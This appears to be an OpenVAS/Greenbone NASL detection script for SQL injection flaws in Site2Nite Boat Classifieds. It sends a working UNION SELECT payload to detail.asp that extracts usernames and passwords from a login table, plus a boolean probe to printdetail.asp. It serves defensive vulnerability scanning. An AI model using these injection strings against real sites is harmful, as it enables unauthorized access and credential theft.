if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801378" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-07-16 19:44:55 +0200 (Fri, 16 Jul 2010)" );
	script_cve_id( "CVE-2010-2687", "CVE-2010-2688" );
	script_bugtraq_id( 41046, 41059 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Site2Nite Boat Classifieds Multiple SQL Injection Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/13990/" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/13995/" );
	script_xref( name: "URL", value: "http://www.vupen.com/english/advisories/2010/1576" );
	script_tag( name: "impact", value: "Successful exploitation will let attackers to gain unauthorized
  access and obtain sensitive information." );
	script_tag( name: "affected", value: "Site2Nite Boat Classifieds" );
	script_tag( name: "insight", value: "The flaws are caused by improper validation of user-supplied
  input via the 'id' parameter in 'detail.asp' and 'printdetail.asp' that allows
  attackers to manipulate SQL queries by injecting arbitrary SQL code." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Site2Nite Boat Classifieds and is prone to
  SQL injection vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_asp( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/boat-webdesign", "/products/boat-webdesign/www", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/detail.asp?ID=999999 union select1,2,3," + "4,5,username,password,8,9,10,11,12,13,14,15,16,17,18,19,20," + "21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40," + "41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60," + "61,62,63,64,65,66,67,68,69,70,71,72,73,74from tbllogin \"" + "having 1=1--\"" );
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
		continue;
	}
	if(( ContainsString( res, "/boat-webdesign/" ) ) && ( ( ContainsString( res, "DELETE" ) ) || ( ContainsString( res, "SELECT" ) ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
	url = NASLString( dir, "/printdetail.asp?Id=661 and 1=1" );
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
		exit( 99 );
	}
	if(( ContainsString( res, ">BOAT DETAILS - Site Id" ) ) && ( ContainsString( res, ">Seller Information:<" ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

